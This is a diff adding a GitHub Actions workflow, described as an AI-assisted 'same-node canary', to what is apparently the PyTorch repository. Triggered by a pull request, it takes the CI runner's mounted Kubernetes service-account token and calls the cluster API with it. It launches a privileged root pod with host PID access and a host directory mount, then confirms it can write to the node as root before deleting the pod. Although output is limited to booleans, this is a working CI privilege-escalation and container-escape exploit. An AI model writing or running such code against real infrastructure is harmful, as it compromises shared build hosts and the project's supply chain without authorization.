@@ -1,0 +1,445 @@
+# Owner(s): ["module: ci"]
+# AI-assisted temporary same-node diagnostic. No named host files are created.
+name: CI runner same-node canary
+
+on:
+  pull_request:
+    paths:
+      - .github/workflows/ci-runner-boundary-canary.yml
+
+permissions: {}
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.sha }}-${{ github.event_name == 'workflow_dispatch' }}-${{ github.sha }}
+  cancel-in-progress: true
+
+jobs:
+  probe:
+    if: github.repository == 'pytorch/pytorch'
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: [mt-l-x86iavx512-2-4, lf-l-x86iavx512-2-4]
+    runs-on: ${{ matrix.runner }}
+    timeout-minutes: 8
+    container:
+      image: python:3.12-slim@sha256:5e2bdb1b0d542d5039cffb8181c65930093949194a65c365dfb1b0fe13a4fa5b
+      volumes:
+        - /var/run/secrets/kubernetes.io/serviceaccount:/audit-source:ro
+    steps:
+      - name: Validate same-node host root with an anonymous inode and delete the temporary Pod
+        env:
+          EXPECTED_RUNNER_NAME: ${{ runner.name }}
+        shell: sh
+        run: |
+          python3 - <<'PY'
+          """Bounded same-node CI canary. All output is booleans; no resource/credential bodies."""
+          import base64
+          import hashlib
+          import json
+          import os
+          from pathlib import Path
+          import re
+          import socket
+          import ssl
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+          import uuid
+
+          SOURCE = Path("/audit-source")
+          NAMESPACE = "arc-runners"
+          EXPECTED_SUBJECT = "system:serviceaccount:arc-runners:arc-runner"
+          BASE = "https://kubernetes.default.svc"  # @lint-ignore: cluster-local API
+          COLLECTION = "/api/v1/namespaces/arc-runners/pods"
+          SSAR = "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"
+          POD_IMAGE = "python:3.12-slim@sha256:5e2bdb1b0d542d5039cffb8181c65930093949194a65c365dfb1b0fe13a4fa5b"
+          MAX_JSON = 1024 * 1024
+          MAX_LOG = 8192
+          INNER_TEMPLATE = '"""Executed only in the uniquely owned, same-node canary Pod."""\nimport json\nimport os\nimport stat\n\nEXPECTED_NODE = __EXPECTED_NODE__\nMARKER = bytes.fromhex(__MARKER_HEX__)\nHOST_DIRECTORY = "/audit-host-var-tmp"\n\n\ndef anonymous_marker(directory, marker):\n    result = {\n        "anonymous_inode_opened": False,\n        "anonymous_inode_unlinked": False,\n        "anonymous_inode_root_owned": False,\n        "marker_readback": False,\n        "anonymous_inode_closed": False,\n        "marker_error": False,\n    }\n    fd = None\n    try:\n        # No named-file fallback: close/SIGKILL leaves no directory entry.\n        flags = os.O_TMPFILE | os.O_RDWR | os.O_CLOEXEC | os.O_NOFOLLOW\n        fd = os.open(directory, flags, 0o600)\n        result["anonymous_inode_opened"] = True\n        before = os.fstat(fd)\n        result["anonymous_inode_unlinked"] = stat.S_ISREG(before.st_mode) and before.st_nlink == 0\n        result["anonymous_inode_root_owned"] = before.st_uid == 0\n        if not result["anonymous_inode_unlinked"] or not result["anonymous_inode_root_owned"]:\n            return result\n        if os.write(fd, marker) != len(marker):\n            return result\n        os.fsync(fd)\n        os.lseek(fd, 0, os.SEEK_SET)\n        result["marker_readback"] = os.read(fd, len(marker) + 1) == marker and os.fstat(fd).st_nlink == 0\n    except Exception:\n        result["marker_error"] = True\n    finally:\n        if fd is not None:\n            try:\n                os.close(fd)\n                result["anonymous_inode_closed"] = True\n            except OSError:\n                result["marker_error"] = True\n    return result\n\n\ndef main():\n    result = {\n        "same_node": os.environ.get("ACTUAL_NODE") == EXPECTED_NODE,\n        "uid_zero": os.getuid() == 0,\n        "host_pid1_uid_zero": False,\n        "same_host_user_namespace": False,\n        "anonymous_inode_opened": False,\n        "anonymous_inode_unlinked": False,\n        "anonymous_inode_root_owned": False,\n        "marker_readback": False,\n        "anonymous_inode_closed": False,\n        "marker_error": False,\n        "probe_error": False,\n    }\n    try:\n        if not result["same_node"] or not result["uid_zero"]:\n            return result\n        result["host_pid1_uid_zero"] = os.stat("/proc/1").st_uid == os.getuid() == 0\n        if not result["host_pid1_uid_zero"]:\n            return result\n        parent = os.stat("/proc/1/ns/user")\n        current = os.stat("/proc/self/ns/user")\n        result["same_host_user_namespace"] = (parent.st_dev, parent.st_ino) == (current.st_dev, current.st_ino)\n        if not result["same_host_user_namespace"]:\n            return result\n        result.update(anonymous_marker(HOST_DIRECTORY, MARKER))\n    except Exception:\n        result["probe_error"] = True\n    return result\n\n\nif __name__ == "__main__":\n    print(json.dumps(main(), sort_keys=True))\n    # Kubelet copies this one boolean-only line into the Pod\'s terminal status.\n    # Reading UID-checked Pod status avoids the name-only pod/log API race.\n    raise SystemExit(1)\n'
+          INNER_KEYS = frozenset((
+              "same_node", "uid_zero", "host_pid1_uid_zero", "same_host_user_namespace", "anonymous_inode_opened",
+              "anonymous_inode_unlinked", "anonymous_inode_root_owned", "marker_readback",
+              "anonymous_inode_closed", "marker_error", "probe_error",
+          ))
+
+
+          class NoRedirect(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, headers, newurl):
+                  return None
+
+
+          def dns_name(value, maximum=253):
+              return isinstance(value, str) and 0 < len(value) <= maximum and all(
+                  re.fullmatch(r"[a-z0-9](?:[-a-z0-9]{0,61}[a-z0-9])?", part)
+                  for part in value.split(".")
+              )
+
+
+          def uid(value):
+              try:
+                  return isinstance(value, str) and str(uuid.UUID(value)) == value
+              except ValueError:
+                  return False
+
+
+          def child_nonce(runner_name, run_id, run_attempt):
+              if not dns_name(runner_name) or not re.fullmatch(r"[0-9]+", run_id) or not re.fullmatch(r"[0-9]+", run_attempt):
+                  raise ValueError("invalid workflow identity")
+              identity = json.dumps([runner_name, run_id, run_attempt], separators=(",", ":")).encode()
+              return hashlib.sha256(identity).hexdigest()[:32]
+
+
+          def own_pod_name(runner_name, hostname):
+              if not dns_name(runner_name) or not dns_name(hostname, 63):
+                  raise ValueError("invalid Pod identity")
+              if hostname != runner_name[:54] + "-workflow":
+                  raise ValueError("hostname does not match registered runner")
+              return hostname
+
+
+          def validate_own_pod(pod, runner_name, hostname):
+              meta, spec, status = pod.get("metadata", {}), pod.get("spec", {}), pod.get("status", {})
+              if not (
+                  pod.get("kind") == "Pod" and meta.get("name") == hostname
+                  and meta.get("namespace") == NAMESPACE and uid(meta.get("uid"))
+                  and meta.get("labels", {}).get("runner-pod") == runner_name
+                  and not meta.get("deletionTimestamp") and status.get("phase") == "Running"
+                  and spec.get("serviceAccountName") == "arc-workflow"
+                  and spec.get("automountServiceAccountToken") is False
+                  and dns_name(spec.get("nodeName"))
+              ):
+                  raise ValueError("own workflow Pod verification failed")
+              tolerations = spec.get("tolerations", [])
+              if not isinstance(tolerations, list) or len(tolerations) > 32 or any(not isinstance(t, dict) for t in tolerations):
+                  raise ValueError("invalid own tolerations")
+              # nodeName bypasses scheduling, not NoExecute eviction. Copy only the
+              # existing workflow Pod's relevant tolerations; never broaden them.
+              tolerations = [t for t in tolerations if t.get("effect", "") in ("", "NoExecute")]
+              return {"name": hostname, "uid": meta["uid"], "node": spec["nodeName"], "tolerations": tolerations}
+
+
+          def inner_script(node, nonce):
+              if not dns_name(node) or not re.fullmatch(r"[0-9a-f]{32}", nonce):
+                  raise ValueError("invalid probe constants")
+              return INNER_TEMPLATE.replace("__EXPECTED_NODE__", repr(node)).replace("__MARKER_HEX__", repr(nonce))
+
+
+          def proposed_pod(own, name, nonce):
+              if name != "ci-boundary-" + nonce or not dns_name(name, 63) or not uid(own["uid"]):
+                  raise ValueError("invalid canary identity")
+              return {
+                  "apiVersion": "v1", "kind": "Pod",
+                  "metadata": {
+                      "name": name, "namespace": NAMESPACE,
+                      "labels": {"ci-security-canary": nonce},
+                      "ownerReferences": [{"apiVersion": "v1", "kind": "Pod", "name": own["name"], "uid": own["uid"], "controller": False, "blockOwnerDeletion": False}],
+                  },
+                  "spec": {
+                      "nodeName": own["node"], "tolerations": own["tolerations"], "serviceAccountName": "arc-workflow",
+                      "automountServiceAccountToken": False, "enableServiceLinks": False,
+                      "hostPID": True, "hostUsers": True, "hostNetwork": False, "hostIPC": False,
+                      "restartPolicy": "Never", "activeDeadlineSeconds": 60, "terminationGracePeriodSeconds": 0,
+                      "containers": [{
+                          "name": "probe", "image": POD_IMAGE, "imagePullPolicy": "IfNotPresent",
+                          "terminationMessagePolicy": "FallbackToLogsOnError",
+                          "command": ["python3", "-c", inner_script(own["node"], nonce)],
+                          "env": [{"name": "ACTUAL_NODE", "valueFrom": {"fieldRef": {"apiVersion": "v1", "fieldPath": "spec.nodeName"}}}, {"name": "PYTHONDONTWRITEBYTECODE", "value": "1"}],
+                          "securityContext": {"privileged": True, "readOnlyRootFilesystem": True, "runAsUser": 0, "runAsGroup": 0},
+                          "resources": {"requests": {"cpu": "10m", "memory": "32Mi"}, "limits": {"cpu": "100m", "memory": "64Mi"}},
+                          "volumeMounts": [{"name": "host-var-tmp", "mountPath": "/audit-host-var-tmp", "readOnly": False}],
+                      }],
+                      "volumes": [{"name": "host-var-tmp", "hostPath": {"path": "/var/tmp", "type": "Directory"}}],
+                  },
+              }
+
+
+          def ownership_matches(pod, expected):
+              meta, want = pod.get("metadata", {}), expected["metadata"]
+              return (
+                  meta.get("name") == want["name"] and meta.get("namespace") == NAMESPACE
+                  and meta.get("labels", {}).get("ci-security-canary") == want["labels"]["ci-security-canary"]
+                  and meta.get("ownerReferences") == want["ownerReferences"]
+                  and uid(meta.get("uid"))
+              )
+
+
+          def admitted_spec_preserved(pod, expected):
+              meta, spec, wanted = pod.get("metadata", {}), pod.get("spec", {}), expected["spec"]
+              if meta.get("finalizers"):
+                  return False
+              if not (pod.get("kind") == "Pod" and meta.get("name") == expected["metadata"]["name"] and meta.get("namespace") == NAMESPACE
+                      and meta.get("labels", {}).get("ci-security-canary") == expected["metadata"]["labels"]["ci-security-canary"]
+                      and meta.get("ownerReferences") == expected["metadata"]["ownerReferences"]):
+                  return False
+              if any(spec.get(k) != wanted[k] for k in ("nodeName", "serviceAccountName", "automountServiceAccountToken", "enableServiceLinks", "hostPID", "hostUsers", "restartPolicy", "activeDeadlineSeconds", "terminationGracePeriodSeconds")):
+                  return False
+              if spec.get("tolerations", []) != wanted["tolerations"]:
+                  return False
+              if spec.get("hostNetwork", False) or spec.get("hostIPC", False) or spec.get("initContainers") or spec.get("ephemeralContainers"):
+                  return False
+              if spec.get("securityContext") or spec.get("shareProcessNamespace", False):
+                  return False
+              if spec.get("volumes") != wanted["volumes"] or len(spec.get("containers", [])) != 1:
+                  return False
+              got, want = spec["containers"][0], wanted["containers"][0]
+              if set(got) - set(want) - {"terminationMessagePath", "stdin", "stdinOnce", "tty"}:
+                  return False
+              if got.get("terminationMessagePath", "/dev/termination-log") != "/dev/termination-log" or any(got.get(k, False) for k in ("stdin", "stdinOnce", "tty")):
+                  return False
+              if any(got.get(k) != want[k] for k in ("name", "image", "imagePullPolicy", "terminationMessagePolicy", "command", "env", "securityContext", "resources")) or got.get("args"):
+                  return False
+              mounts = got.get("volumeMounts", [])
+              return len(mounts) == 1 and {k: v for k, v in mounts[0].items() if not (k == "readOnly" and v is False)} == {"name": "host-var-tmp", "mountPath": "/audit-host-var-tmp"}
+
+
+          class Client:
+              def __init__(self, token, opener, own_name, child_name):
+                  self.token, self.opener = token, opener
+                  self.own_path, self.child_path = COLLECTION + "/" + own_name, COLLECTION + "/" + child_name
+                  self.child_name = child_name
+                  self.approved_payload = None
+                  self.cleanup_preflight_allowed = False
+                  self.create_attempted = False
+                  self.created_uid = None
+                  self.delete_uid = None
+
+              def cleanup_review(self, verb):
+                  if verb not in ("get", "delete", "watch"):
+                      raise ValueError("invalid cleanup verb")
+                  return {"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectAccessReview", "spec": {"resourceAttributes": {"group": "", "resource": "pods", "namespace": NAMESPACE, "name": self.child_name, "verb": verb}}}
+
+              def preflight_cleanup(self):
+                  self.cleanup_preflight_allowed = False
+                  for verb in ("get", "delete", "watch"):
+                      review = self.cleanup_review(verb)
+                      status, response = self.json("POST", SSAR, json.dumps(review).encode())
+                      decision = response.get("status", {})
+                      attributes = response.get("spec", {}).get("resourceAttributes", {})
+                      expected = review["spec"]["resourceAttributes"]
+                      # API JSON omits the empty core group on serialization.
+                      scope_preserved = set(response.get("spec", {})) == {"resourceAttributes"} and attributes.get("group", "") == "" and {k: v for k, v in attributes.items() if k != "group"} == {k: v for k, v in expected.items() if k != "group"}
+                      if (status != 201 or response.get("kind") != "SelfSubjectAccessReview" or not scope_preserved
+                              or decision.get("allowed") is not True or decision.get("denied", False) or decision.get("evaluationError")):
+                          return False
+                  self.cleanup_preflight_allowed = True
+                  return True
+
+              def remember_created(self, status, obj):
+                  meta = obj.get("metadata", {})
+                  if not (self.create_attempted and status == 201 and obj.get("kind") == "Pod"
+                          and meta.get("name") == self.child_name and meta.get("namespace") == NAMESPACE and uid(meta.get("uid"))):
+                      return False
+                  self.created_uid = meta["uid"]
+                  return True
+
+              def authorize(self, method, path, payload):
+                  parsed = urllib.parse.urlsplit(path)
+                  query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+                  if parsed.scheme or parsed.netloc or parsed.fragment:
+                      raise ValueError("nonlocal API path")
+                  if method == "POST" and parsed.path == SSAR and not query:
+                      if json.loads(payload) in [self.cleanup_review(verb) for verb in ("get", "delete", "watch")]:
+                          return
+                  if method == "POST" and parsed.path == COLLECTION:
+                      if query == [("dryRun", "All")]:
+                          return
+                      if not query and self.cleanup_preflight_allowed and payload == self.approved_payload and payload is not None and not self.create_attempted:
+                          self.create_attempted = True
+                          return
+                  if method == "GET" and not query and parsed.path in (self.own_path, self.child_path):
+                      return
+                  if method == "GET" and parsed.path == COLLECTION and len(query) == 4:
+                      params = dict(query)
+                      if (len(params) == 4 and params.get("watch") == "true" and params.get("fieldSelector") == "metadata.name=" + self.child_name
+                              and re.fullmatch(r"[0-9]+", params.get("resourceVersion", ""))
+                              and re.fullmatch(r"[0-9]+", params.get("timeoutSeconds", "")) and 1 <= int(params["timeoutSeconds"]) <= 90):
+                          return
+                  if method == "DELETE" and not query and parsed.path == self.child_path and self.delete_uid is not None:
+                      expected = {"apiVersion": "v1", "kind": "DeleteOptions", "gracePeriodSeconds": 0, "preconditions": {"uid": self.delete_uid}}
+                      if json.loads(payload) == expected:
+                          return
+                  raise ValueError("out-of-scope API operation")
+
+              def open(self, method, path, payload=None, timeout=10, partial=False):
+                  self.authorize(method, path, payload)
+                  headers = {"Authorization": "Bearer " + self.token, "Content-Type": "application/json"}
+                  if partial:
+                      headers["Accept"] = "application/json;as=PartialObjectMetadata;g=meta.k8s.io;v=v1"
+                  return self.opener.open(urllib.request.Request(BASE + path, data=payload, method=method, headers=headers), timeout=timeout)
+
+              def json(self, method, path, payload=None, partial=False):
+                  with self.open(method, path, payload, partial=partial) as response:
+                      raw = response.read(MAX_JSON + 1)
+                      if len(raw) > MAX_JSON:
+                          raise ValueError("oversized API response")
+                      return response.status, json.loads(raw)
+
+              def get_child(self, partial=False):
+                  try:
+                      return self.json("GET", self.child_path, partial=partial)[1]
+                  except urllib.error.HTTPError as error:
+                      if error.code == 404:
+                          return None
+                      raise
+
+              def watch(self, child_uid, resource_version, deleted=False, timeout=90):
+                  if not uid(child_uid) or not re.fullmatch(r"[0-9]+", resource_version):
+                      raise ValueError("invalid watch identity")
+                  query = urllib.parse.urlencode({"watch": "true", "fieldSelector": "metadata.name=" + self.child_name, "resourceVersion": resource_version, "timeoutSeconds": str(timeout)})
+                  with self.open("GET", COLLECTION + "?" + query, timeout=timeout + 5) as response:
+                      while True:
+                          line = response.readline(MAX_JSON + 1)
+                          if not line:
+                              return False
+                          if len(line) > MAX_JSON:
+                              raise ValueError("oversized watch event")
+                          event = json.loads(line)
+                          obj = event.get("object", {})
+                          meta = obj.get("metadata", {})
+                          if meta.get("name") != self.child_name or meta.get("namespace") != NAMESPACE or meta.get("uid") != child_uid:
+                              continue
+                          if deleted and event.get("type") == "DELETED":
+                              return True
+                          if not deleted and obj.get("status", {}).get("phase") in ("Succeeded", "Failed"):
+                              return True
+
+              def wait_terminal(self, child_uid):
+                  obj = self.get_child()
+                  if obj is None or obj.get("metadata", {}).get("uid") != child_uid:
+                      return False
+                  if obj.get("status", {}).get("phase") in ("Succeeded", "Failed"):
+                      return True
+                  return self.watch(child_uid, obj["metadata"]["resourceVersion"])
+
+              def cleanup(self, expected):
+                  obj = self.get_child(partial=True)
+                  if obj is None:
+                      return True
+                  meta = obj.get("metadata", {})
+                  if not (obj.get("kind") == "PartialObjectMetadata" and meta.get("name") == self.child_name
+                          and meta.get("namespace") == NAMESPACE and uid(meta.get("uid"))):
+                      return False
+                  if self.created_uid is not None and meta["uid"] != self.created_uid:
+                      return False
+                  if self.created_uid is None and not ownership_matches(obj, expected):
+                      return False
+                  self.delete_uid = obj["metadata"]["uid"]
+                  resource_version = obj["metadata"]["resourceVersion"]
+                  payload = json.dumps({"apiVersion": "v1", "kind": "DeleteOptions", "gracePeriodSeconds": 0, "preconditions": {"uid": self.delete_uid}}).encode()
+                  try:
+                      self.json("DELETE", self.child_path, payload)
+                  except urllib.error.HTTPError as error:
+                      if error.code == 404:
+                          return True
+                      raise
+                  current = self.get_child(partial=True)
+                  if current is None:
+                      return True
+                  if current.get("metadata", {}).get("uid") != self.delete_uid:
+                      return False
+                  return self.watch(self.delete_uid, current.get("metadata", {}).get("resourceVersion", resource_version), deleted=True, timeout=60)
+
+
+          def main():
+              result = {key: False for key in (
+                  "native_job_token_absent", "copied_identity_matches_runner", "own_pod_verified",
+                  "exact_spec_dry_run_allowed", "cleanup_preflight_allowed", "pod_create_attempted", "created_uid_recorded", "owned_pod_created", "actual_spec_preserved",
+                  "pod_reached_terminal", "host_same_node", "host_uid_zero", "host_pid1_uid_zero", "host_same_user_namespace",
+                  "host_anonymous_inode_unlinked", "host_inode_root_owned", "host_marker_readback",
+                  "host_anonymous_inode_closed", "host_root_write_confirmed", "cleanup_confirmed", "cleanup_failed", "probe_error",
+              )}
+              client = expected = None
+              conflict = False
+              try:
+                  result["native_job_token_absent"] = not Path("/var/run/secrets/kubernetes.io/serviceaccount/token").exists()
+                  token_bytes = (SOURCE / "token").read_bytes().strip()
+                  if not 0 < len(token_bytes) <= 16384 or (SOURCE / "namespace").read_text().strip() != NAMESPACE:
+                      return result
+                  token = token_bytes.decode("ascii")
+                  payload = token.split(".")[1]
+                  claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
+                  result["copied_identity_matches_runner"] = claims.get("sub") == EXPECTED_SUBJECT
+                  if not result["copied_identity_matches_runner"]:
+                      return result
+                  runner_name = os.environ.get("EXPECTED_RUNNER_NAME", "")
+                  name = own_pod_name(runner_name, socket.gethostname())
+                  nonce = child_nonce(runner_name, os.environ.get("GITHUB_RUN_ID", ""), os.environ.get("GITHUB_RUN_ATTEMPT", ""))
+                  child_name = "ci-boundary-" + nonce
+                  context = ssl.create_default_context(cafile=str(SOURCE / "ca.crt"))
+                  opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), urllib.request.HTTPSHandler(context=context), NoRedirect())
+                  client = Client(token, opener, name, child_name)
+                  own = validate_own_pod(client.json("GET", client.own_path)[1], runner_name, name)
+                  result["own_pod_verified"] = True
+                  expected = proposed_pod(own, child_name, nonce)
+                  encoded = json.dumps(expected, sort_keys=True, separators=(",", ":")).encode()
+                  status, dry = client.json("POST", COLLECTION + "?dryRun=All", encoded)
+                  result["exact_spec_dry_run_allowed"] = status == 201 and admitted_spec_preserved(dry, expected)
+                  if not result["exact_spec_dry_run_allowed"]:
+                      return result
+                  result["cleanup_preflight_allowed"] = client.preflight_cleanup()
+                  if not result["cleanup_preflight_allowed"]:
+                      return result
+                  client.approved_payload = encoded
+                  try:
+                      status, created = client.json("POST", COLLECTION, encoded)
+                  except urllib.error.HTTPError as error:
+                      conflict = error.code == 409
+                      raise
+                  # The exact server-returned identity is authoritative for cleanup even
+                  # if admission changed labels, ownerReferences, or the requested spec.
+                  result["created_uid_recorded"] = client.remember_created(status, created)
+                  if not result["created_uid_recorded"] or not ownership_matches(created, expected):
+                      return result
+                  result["owned_pod_created"] = True
+                  child_uid = created["metadata"]["uid"]
+                  result["actual_spec_preserved"] = admitted_spec_preserved(created, expected)
+                  if not result["actual_spec_preserved"]:
+                      return result
+                  result["pod_reached_terminal"] = client.wait_terminal(child_uid)
+                  if not result["pod_reached_terminal"]:
+                      return result
+                  # The terminal message is returned atomically with the exact Pod UID.
+                  # The name-only pods/log endpoint is intentionally not permitted.
+                  current = client.get_child()
+                  if current is None or not ownership_matches(current, expected) or current["metadata"]["uid"] != child_uid:
+                      return result
+                  states = current.get("status", {}).get("containerStatuses", [])
+                  if len(states) != 1 or states[0].get("name") != "probe":
+                      return result
+                  terminal = states[0].get("state", {}).get("terminated", {})
+                  raw = terminal.get("message", "")
+                  if terminal.get("exitCode") != 1 or not isinstance(raw, str) or len(raw) > MAX_LOG:
+                      return result
+                  proof = json.loads(raw)
+                  if set(proof) != INNER_KEYS or not all(type(value) is bool for value in proof.values()):
+                      return result
+                  mapping = {
+                      "same_node": "host_same_node", "uid_zero": "host_uid_zero", "host_pid1_uid_zero": "host_pid1_uid_zero", "same_host_user_namespace": "host_same_user_namespace",
+                      "anonymous_inode_unlinked": "host_anonymous_inode_unlinked", "anonymous_inode_root_owned": "host_inode_root_owned",
+                      "marker_readback": "host_marker_readback", "anonymous_inode_closed": "host_anonymous_inode_closed",
+                  }
+                  for source, target in mapping.items():
+                      result[target] = proof[source]
+                  result["host_root_write_confirmed"] = all(proof[key] for key in INNER_KEYS - {"marker_error", "probe_error"}) and not proof["marker_error"] and not proof["probe_error"]
+              except Exception:
+                  result["probe_error"] = True
+              finally:
+                  if client is not None:
+                      result["pod_create_attempted"] = client.create_attempted
+                      if client.create_attempted and expected is not None and not conflict:
+                          try:
+                              result["cleanup_confirmed"] = client.cleanup(expected)
+                          except Exception:
+                              result["probe_error"] = True
+                      if client.create_attempted and not result["cleanup_confirmed"]:
+                          result["cleanup_failed"] = True
+                          result["probe_error"] = True
+              return result
+
+
+          if __name__ == "__main__":
+              result = main()
+              print(json.dumps(result, sort_keys=True))
+              raise SystemExit(0 if result["host_root_write_confirmed"] and result["cleanup_confirmed"] else 1)
+          PY
